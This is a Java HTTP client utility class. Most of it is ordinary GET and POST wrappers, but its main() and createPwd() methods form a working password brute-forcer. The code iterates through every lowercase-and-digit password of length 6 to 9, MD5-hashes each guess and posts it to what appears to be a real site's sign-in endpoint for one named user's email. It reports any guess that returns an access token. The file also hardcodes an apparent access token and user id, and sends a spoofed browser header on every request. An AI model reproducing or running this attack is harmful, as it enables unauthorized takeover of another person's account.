package com.renrenxian.common.util;

import static java.lang.String.format;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.HostConfiguration;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpMethod;
import org.apache.commons.httpclient.HttpMethodBase;
import org.apache.commons.httpclient.HttpState;
import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.StringRequestEntity;
import org.apache.commons.httpclient.params.HttpClientParams;
import org.apache.commons.httpclient.params.HttpConnectionManagerParams;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.commons.lang.StringUtils;
import org.apache.log4j.Logger;

/**
 * HTTP3.1操作封装类
 */
public class HttpClientUtils {

	public static class GetMethod extends
			org.apache.commons.httpclient.methods.GetMethod {

		boolean isRelease = false;

		public GetMethod() {
			super();
		}

		public GetMethod(String uri) {
			super(uri);
		}

		@Override
		protected void finalize() throws Throwable {
			if (!isRelease) {
				log.error("HTTP CONNECTION NOT RELEASED!");
				releaseConnection();
			}
			super.finalize();
		}

		@Override
		public void releaseConnection() {
			isRelease = true;
			super.releaseConnection();
		}
	}

	public static class PostMethod extends
			org.apache.commons.httpclient.methods.PostMethod {

		boolean isRelease = false;

		public PostMethod() {
			super();
		}

		public PostMethod(String uri) {
			super(uri);
		}

		@Override
		protected void finalize() throws Throwable {
			if (!isRelease) {
				log.error("HTTP CONNECTION NOT RELEASED!");
				releaseConnection();
			}
			super.finalize();
		}

		@Override
		public void releaseConnection() {
			isRelease = true;
			super.releaseConnection();
		}
	}

	private static volatile Map<String, HttpClientUtils> map = new ConcurrentHashMap<String, HttpClientUtils>();

	/**
	 * 默认字符集
	 */
	public static final String DefaultEncoding = "UTF-8";

	private static final Logger log = Logger.getLogger(HttpClientUtils.class);

	private static final Cookie[] EMPTY_COOKIES = new Cookie[0];

	/**
	 * @see #getResponse(String)
	 * @see #postResponse(String, Map)
	 * @see #getResponse(String, Charsets, boolean)
	 * @deprecated 2011/12/13
	 */
	public static String getByUrl(String url) throws Exception {
		return getInstance().getResponse(url);
	}

	/**
	 * 获取默认的HttpClientUtils connectionTimeout 3000，soTimeOut 5000
	 * 
	 * @return
	 */
	public static HttpClientUtils getInstance() {
		return getInstance(3000, 5000);
	}

	/**
	 * @param connectionTimeout
	 *            3000为3秒
	 * @param soTimeOut
	 * @return
	 */
	public static HttpClientUtils getInstance(int connectionTimeout,
			int soTimeOut) {
		String key = connectionTimeout + ":" + soTimeOut;
		HttpClientUtils httpClientUtils = map.get(key);
		if (httpClientUtils == null) {
			synchronized (HttpClientUtils.class) {
				httpClientUtils = map.get(key);
				if (httpClientUtils == null) {
					httpClientUtils = new HttpClientUtils(connectionTimeout,
							soTimeOut);
					map.put(key, httpClientUtils);
				}
			}
		}
		return httpClientUtils;
	}

	private HttpClient httpClient;

	private HttpClientUtils(int connectionTimeout, int soTimeOut) {
		MultiThreadedHttpConnectionManager httpClientManager;
		httpClientManager = new MultiThreadedHttpConnectionManager();
		HttpConnectionManagerParams params = new HttpConnectionManagerParams();
		params.setStaleCheckingEnabled(true);
		params.setMaxTotalConnections(1024);
		params.setDefaultMaxConnectionsPerHost(512);
		params.setConnectionTimeout(connectionTimeout);// 3000
		params.setSoTimeout(soTimeOut);// 5000
		httpClientManager.setParams(params);
		HttpClientParams httpClientParams = new HttpClientParams();
		httpClientParams.setConnectionManagerTimeout(5000L);// 5秒获取不到一个连接就释放一个错误
		httpClient = new HttpClient(httpClientParams, httpClientManager);
	}

	/**
	 * 执行一个GET请求
	 * 
	 * @param get
	 *            get参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的GET操作结果，连接是没有被关闭的
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public GetMethod get(GetMethod get, boolean throwExceptionIfAbNormal)
			throws IOException {
		execute(get, throwExceptionIfAbNormal, EMPTY_COOKIES);
		return get;
	}

	/**
	 * @see #get(String)
	 * @see #getResponse(String)
	 * @see #postResponse(String, Map)
	 * @deprecated 2011/12/13
	 */
	public GetMethod get(HttpUrl httpUrl) throws Exception {

		if (httpUrl == null)
			return null;

		HostConfiguration config = new HostConfiguration();
		config.setHost(httpUrl.getHost(), httpUrl.getPort());

		GetMethod get = new GetMethod(httpUrl.getPath());
		setHeadersAndCharset(get, Charsets.UTF8);
		setParams(httpUrl.getParams(), get);

		if (log.isDebugEnabled()) {
			log.debug("query : " + get.getQueryString());
		}
		int result = httpClient.executeMethod(config, get);
		if (log.isDebugEnabled()) {
			log.debug("HttpClient.executeMethod returns result = [" + result
					+ "]");

		}
		if (result != 200)
			throw new Exception("wrong HttpClient.executeMethod get method !");

		return get;
	}

	/**
	 * 执行一个GET请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @return 执行的GET操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public GetMethod get(String url) throws IOException {
		return get(url, Charsets.UTF8, true);
	}

	/**
	 * 执行一个GET请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的GET操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public GetMethod get(String url, boolean throwExceptionIfAbNormal)
			throws IOException {
		return get(url, Charsets.UTF8, throwExceptionIfAbNormal);
	}

	/**
	 * 执行一个GET请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的GET操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public GetMethod get(String url, Charsets charset,
			boolean throwExceptionIfAbNormal) throws IOException {
		return get(url, charset, throwExceptionIfAbNormal, EMPTY_COOKIES);
	}

	/**
	 * 执行一个GET请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie信息
	 * @return 执行的GET操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public GetMethod get(String url, Charsets charset,
			boolean throwExceptionIfAbNormal, Cookie... cookies)
			throws IOException {
		GetMethod get = new GetMethod(url);
		if (cookies == null || cookies.length == 0) {
			get.getParams().setCookiePolicy(CookiePolicy.IGNORE_COOKIES);
		}
		setHeadersAndCharset(get, charset);
		execute(get, throwExceptionIfAbNormal, cookies);
		return get;
	}

	/**
	 * 执行一个GET请求，并返回执行结果
	 * 
	 * @param get
	 *            get参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String getResponse(GetMethod get, boolean throwExceptionIfAbNormal)
			throws IOException {
		get(get, throwExceptionIfAbNormal);
		return resultMethod2String(get);
	}

	/**
	 * 执行一个GET请求，并返回执行结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String getResponse(String url) throws IOException {
		return resultMethod2String(get(url, Charsets.UTF8, true));
	}

	/**
	 * 执行一个GET请求，并返回执行结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String getResponse(String url, boolean throwExceptionIfAbNormal)
			throws IOException {
		return resultMethod2String(get(url, Charsets.UTF8,
				throwExceptionIfAbNormal));
	}

	/**
	 * 执行一个GET请求，并返回执行结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String getResponse(String url, Charsets charset,
			boolean throwExceptionIfAbNormal) throws IOException {
		return resultMethod2String(get(url, charset, throwExceptionIfAbNormal));
	}

	/**
	 * 执行一个GET请求，并返回执行结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String getResponse(String url, Charsets charset,
			boolean throwExceptionIfAbNormal, Cookie... cookies)
			throws IOException {
		return resultMethod2String(get(url, charset, throwExceptionIfAbNormal,
				cookies));
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param post
	 *            post参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(PostMethod post, boolean throwExceptionIfAbNormal)
			throws IOException {
		execute(post, throwExceptionIfAbNormal, EMPTY_COOKIES);
		return post;
	}

	/**
	 * 执行一个GET/POST请求
	 * 
	 * @param post
	 *            post参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie对象
	 * @return {@link HttpState} 请求返回的Cookie结果，如果有的话
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public HttpState execute(HttpMethod method,
			boolean throwExceptionIfAbNormal, Cookie... cookies)
			throws IOException {
		HttpState state = new HttpState();
		if (cookies != null && cookies.length > 0) {
			state.addCookies(cookies);
		}
		if (method.getParams().getParameter(HttpMethodParams.COOKIE_POLICY) == CookiePolicy.DEFAULT) {
			// 默认使用浏览器兼容模式，手动传递的Cookie协议不做任何限制
			// 解决cookie不规范的问题
			method.getParams().setCookiePolicy(
					CookiePolicy.BROWSER_COMPATIBILITY);
		}
		int statusCode = -1;
		try {
			statusCode = httpClient.executeMethod(null, method, state);
		} catch (IOException ioe) {
			method.releaseConnection();
			throw ioe;
		}

		if (throwExceptionIfAbNormal && statusCode != 200) {
			method.releaseConnection();
			throw new IOException("abnormal, status code:" + statusCode
					+ ", uri:" + method.getURI());
		}
		return state;
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, Map<String, String> params)
			throws IOException {
		return post(url, params, true);
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, Map<String, String> params,
			boolean throwExceptionIfAbNormal) throws IOException {
		return post(url, params, Charsets.UTF8, throwExceptionIfAbNormal);
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, Map<String, String> params,
			Charsets charset, boolean throwExceptionIfAbNormal)
			throws IOException {
		return post(url, params, charset, throwExceptionIfAbNormal,
				EMPTY_COOKIES);
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, Map<String, String> params,
			Charsets charset, boolean throwExceptionIfAbNormal,
			Cookie... cookies) throws IOException {
		PostMethod post = new PostMethod(url);
		post.getParams().setContentCharset(charset.encoding);
		setHeadersAndCharset(post, Charsets.UTF8);
		//
		if (params != null && params.size() > 0) {
			for (Map.Entry<String, String> e : params.entrySet()) {
				post.addParameter(e.getKey(), e.getValue());
			}
		}
		//
		execute(post, throwExceptionIfAbNormal, cookies);
		return post;
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param requestBody
	 *            发送的字符串body部分
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, String requestBody, Charsets charset,
			boolean throwExceptionIfAbNormal) throws IOException {
		return post(url, requestBody, charset, throwExceptionIfAbNormal,
				EMPTY_COOKIES);
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param requestBody
	 *            发送的字符串body部分
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie信息
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, String requestBody, Charsets charset,
			boolean throwExceptionIfAbNormal, Cookie... cookies)
			throws IOException {
		PostMethod post = new PostMethod(url);
		setHeadersAndCharset(post, charset);
		//
		if (requestBody != null && requestBody.length() > 0) {
			post.setRequestEntity(new StringRequestEntity(requestBody, null,
					charset.encoding));
		}
		//
		execute(post, throwExceptionIfAbNormal, cookies);
		return post;
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param paramList
	 *            参数的名称和值对的列表，参数名称可以重复
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, List<NameValuePair> paramList,
			Charsets charset, boolean throwExceptionIfAbNormal)
			throws IOException {
		return post(url, paramList, charset, throwExceptionIfAbNormal,
				EMPTY_COOKIES);
	}

	/**
	 * 执行一个POST请求
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param paramList
	 *            参数的名称和值对的列表，参数名称可以重复
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie信息
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public PostMethod post(String url, List<NameValuePair> paramList,
			Charsets charset, boolean throwExceptionIfAbNormal,
			Cookie... cookies) throws IOException {
		PostMethod post = new PostMethod(url);
		setHeadersAndCharset(post, charset);
		if (paramList != null && paramList.size() > 0) {
			post.setRequestBody(paramList.toArray(new NameValuePair[paramList
					.size()]));
		}
		execute(post, throwExceptionIfAbNormal, cookies);
		return post;
	}

	private void setHeadersAndCharset(HttpMethodBase methodBase,
			Charsets charset) {
		methodBase.getParams().setContentCharset(charset.encoding);
		methodBase
				.setRequestHeader("User-Agent",
						"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0");
		methodBase.setRequestHeader("Referer",
				"http://www.gongzuoquan.com/login.html");
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param post
	 *            post参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 返回的结果字符串，默认以响应头编码，如果为空则以请求头编码，依然为空则以UTF-8编码
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(PostMethod post, boolean throwExceptionIfAbNormal)
			throws IOException {
		return resultMethod2String(post(post, throwExceptionIfAbNormal));
	}

	// ///////////////////////////////////////////////////////

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, Map<String, String> params)
			throws IOException {
		return resultMethod2String(post(url, params));
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, Map<String, String> params,
			boolean throwExceptionIfAbNormal) throws IOException {
		return resultMethod2String(post(url, params, throwExceptionIfAbNormal));
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, Map<String, String> params,
			Charsets charset, boolean throwExceptionIfAbNormal)
			throws IOException {
		return resultMethod2String(post(url, params, charset,
				throwExceptionIfAbNormal));
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param params
	 *            参数，如果为null或者为空则不填充参数
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie信息
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, Map<String, String> params,
			Charsets charset, boolean throwExceptionIfAbNormal,
			Cookie... cookies) throws IOException {
		return resultMethod2String(post(url, params, charset,
				throwExceptionIfAbNormal, cookies));
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param requestBody
	 *            发送的字符串body部分
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, String requestBody)
			throws IOException {
		return postResponse(url, requestBody, Charsets.UTF8, true);
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param requestBody
	 *            发送的字符串body部分
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, String requestBody,
			Charsets charset, boolean throwExceptionIfAbNormal)
			throws IOException {
		return resultMethod2String(post(url, requestBody, charset,
				throwExceptionIfAbNormal));
	}

	/**
	 * 执行一个POST请求，并返回字符串结果
	 * 
	 * @param url
	 *            请求的URL地址（完整地址）
	 * @param charset
	 *            字符集
	 * @param requestBody
	 *            发送的字符串body部分
	 * @param throwExceptionIfAbNormal
	 *            非200状态码时是否抛出异常
	 * @param cookies
	 *            Cookie信息
	 * @return 执行的POST操作
	 * @throws IOException
	 *             任何网络IO异常或者非200状态码异常
	 */
	public String postResponse(String url, String requestBody,
			Charsets charset, boolean throwExceptionIfAbNormal,
			Cookie... cookies) throws IOException {
		return resultMethod2String(post(url, requestBody, charset,
				throwExceptionIfAbNormal, cookies));
	}

	/**
	 * 获取http请求的结果
	 * 
	 * @param method
	 *            请求方法（包含返回结果）
	 * @return 返回的字符串，如果为null，表示是非200的请求
	 * @throws IOException
	 *             任何网络异常或者编码异常
	 */
	public String resultMethod2String(HttpMethodBase method) throws IOException {
		try {
			InputStream in = method.getResponseBodyAsStream();

			if (in == null) {
				return null;// 返回null
			}
			ByteArrayOutputStream baos = new ByteArrayOutputStream(4096);
			int len = -1;
			byte[] b = new byte[4096];
			while ((len = in.read(b)) > 0) {
				baos.write(b, 0, len);
			}
			baos.close();// ignore is ok
			String encoding = method.getResponseCharSet();
			if (encoding == null) {
				encoding = method.getRequestCharSet() != null ? method
						.getRequestCharSet() : Charsets.UTF8.encoding;
			}
			String response = new String(baos.toByteArray(), encoding);
			if (log.isDebugEnabled()) {
				log.debug(format("URL:%s\nResponse:%s", method.getURI(),
						response.trim()));
			}
			return response;
		} finally {
			method.releaseConnection();
		}
	}

	@Deprecated
	private void setParams(HashMap<Object, Object> params, GetMethod get) {
		if (params == null || params.isEmpty()) {
			return;
		}
		StringBuffer strParams = new StringBuffer();

		if (params != null && params.size() > 0) {
			Iterator<Object> keys = params.keySet().iterator();
			while (keys.hasNext()) {
				String key = (String) keys.next();
				strParams.append(key);
				strParams.append("=");
				strParams.append(params.get(key));
				strParams.append("&");
			}
		}

		if (strParams.lastIndexOf("&") == strParams.length())
			strParams.deleteCharAt(strParams.length());

		get.setQueryString(strParams.toString());
	}

	/**
	 * 将一个参数集合转换成queryString（UTF-8编码）
	 * 
	 * @param params
	 *            参数列表，如果为空则返回一个空字符串
	 * @return query字符串
	 * @throws IOException
	 *             编码错误
	 * @see #toQueryString(Map, Charsets, boolean)
	 * @since 2011-12-14
	 */
	public String toQueryString(Map<String, String> params) throws IOException {
		return toQueryString(params, false);
	}

	/**
	 * 将一个参数集合转换成queryString（UTF-8编码）
	 * 
	 * @param params
	 *            参数列表，如果为空则返回一个空字符串
	 * @param withInterrogation
	 *            是否带有一个"？"前缀
	 * @return query字符串
	 * @throws IOException
	 *             编码错误
	 * @see #toQueryString(Map, Charsets, boolean)
	 * @since 2011-12-14
	 */
	public String toQueryString(Map<String, String> params,
			boolean withInterrogation) throws IOException {
		return toQueryString(params, Charsets.UTF8, withInterrogation);
	}

	/**
	 * 将一个参数集合转换成queryString
	 * <p>
	 * 例如有两个字段,name: 无敌小面包, env: product，编码后为:
	 * <p/>
	 * 
	 * <pre>
	 * {@code
	 *      name=%CE%DE%B5%D0%D0%A1%C3%E6%B0%FC&env=product
	 * }
	 * </pre>
	 * <p/>
	 * 如果withInterrogation=true，则编码为：
	 * <p/>
	 * 
	 * <pre>
	 * {@code
	 *      ?name=%CE%DE%B5%D0%D0%A1%C3%E6%B0%FC&env=product
	 * }
	 * </pre>
	 * <p/>
	 * </p>
	 * 
	 * @param params
	 *            参数列表，如果为空则返回一个空字符串
	 * @param charset
	 *            编码字符集
	 * @param withInterrogation
	 *            是否带有一个"？"前缀
	 * @return query字符串
	 * @throws IOException
	 *             编码错误
	 * @since 2011-12-14
	 */
	public String toQueryString(Map<String, String> params, Charsets charset,
			boolean withInterrogation) throws IOException {
		if (params == null || params.size() == 0) {
			return withInterrogation ? "?" : "";
		}
		StringBuilder buf = new StringBuilder(32);
		for (Map.Entry<String, String> e : params.entrySet()) {
			String value = e.getValue() == null ? "" : e.getValue().trim();
			buf.append('&').append(e.getKey().trim()).append('=')
					.append(URLEncoder.encode(value, charset.encoding));
		}
		buf.deleteCharAt(0);
		return withInterrogation ? "?" + buf.toString() : buf.toString();
	}

	/**
	 * 将一个参数集合转换成queryString
	 * 
	 * @param params
	 *            参数列表，是一个数组，奇数元素为key，偶数元素为value，通常key不能是特殊字符、中文等
	 * @return query字符串
	 * @throws IOException
	 *             编码错误
	 * @see #toQueryString(Map, Charsets, boolean)
	 * @see #toQueryString(Charsets, boolean, String...)
	 * @since 2011-12-14
	 */
	public String toQueryString(String... params) throws IOException {
		return toQueryString(Charsets.UTF8, false, params);
	}

	/**
	 * 将一个参数集合转换成queryString
	 * 
	 * @param charset
	 *            字符编码
	 * @param withInterrogation
	 *            是否带有一个"？"前缀
	 * @param params
	 *            参数列表，是一个数组，奇数元素为key，偶数元素为value，通常key不能是特殊字符、中文等
	 * @return query字符串
	 * @throws IOException
	 *             编码错误
	 * @see #toQueryString(Map, Charsets, boolean)
	 * @since 2011-12-14
	 */
	public String toQueryString(Charsets charset, boolean withInterrogation,
			String... params) throws IOException {
		Map<String, String> paramMap = new HashMap<String, String>(2);
		if (params != null && params.length > 0) {
			for (int i = 0; i < params.length; i += 2) {
				if (StringUtils.isBlank(params[i]))
					continue;
				String value = i < params.length - 1 ? params[i + 1] : "";
				paramMap.put(params[i], value);
			}
		}
		return toQueryString(paramMap, charset, withInterrogation);
	}

	public static void main(String[] args) throws Exception {
		HttpClientUtils http = HttpClientUtils.getInstance();
		String url = "http://www.gongzuoquan.com/signin";

		http.createPwd(http,url,6, 9,
				"abcdefghijklmnopqrstuvwxyz0123456789".toCharArray());
		String canshu = "accessToken:15140d93-4bde-433b-9522-148edab9a266,userid:60003719470";
	}

	public void createPwd(HttpClientUtils http,String url,int pwdStartLen, int pwdMaxLen, char[] pwdDict) {
		long pwdDictLen = pwdDict.length;
		char[] pwd = new char[pwdMaxLen + 2];
		int[] array = new int[pwdMaxLen];
		String res = "";
		String reshttp = "";
		int currentLen = pwdStartLen;
		int i, j = 0;
		boolean next;
		try {
			long startTime = System.currentTimeMillis();
			while (currentLen <= pwdMaxLen) {
				for (i = 0; i < pwdMaxLen; i++)
					array[i] = 0;
				next = true;
				while (next) {
					reshttp = "";
					for (i = 0; i < currentLen; i++)
						pwd[i] = pwdDict[array[i]];
					pwd[i] = '\0';
					res = new String(pwd, 0, currentLen);
					String des = MD5.crypt(res);
					Map<String, String> map = new HashMap<String, String>();
					map.put("devid", "PTLThu Apr 24 2014 09:52:30 GMT+0800");
					map.put("user", "haoxw@chanjet.com");
					map.put("rememberMe", "1");
					map.put("password", des);
					reshttp = http.postResponse(url, map, Charsets.UTF8, false, null);
					if(reshttp.indexOf("accessToken")>0)
					System.out.println("res="+res+"   res="+des);else
						System.out.println(reshttp);
					for (j = currentLen - 1; j >= 0; j--) {
						array[j]++;
						if (array[j] != pwdDictLen)
							break;
						else {
							array[j] = 0;
							if (j == 0)
								next = false;
						}
					}
				}
				currentLen++;
			}
			long endTime = System.currentTimeMillis();
			System.out.println("Pwd Generate Complete! "
					+ (endTime - startTime) / 1000.0 + " seconds");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
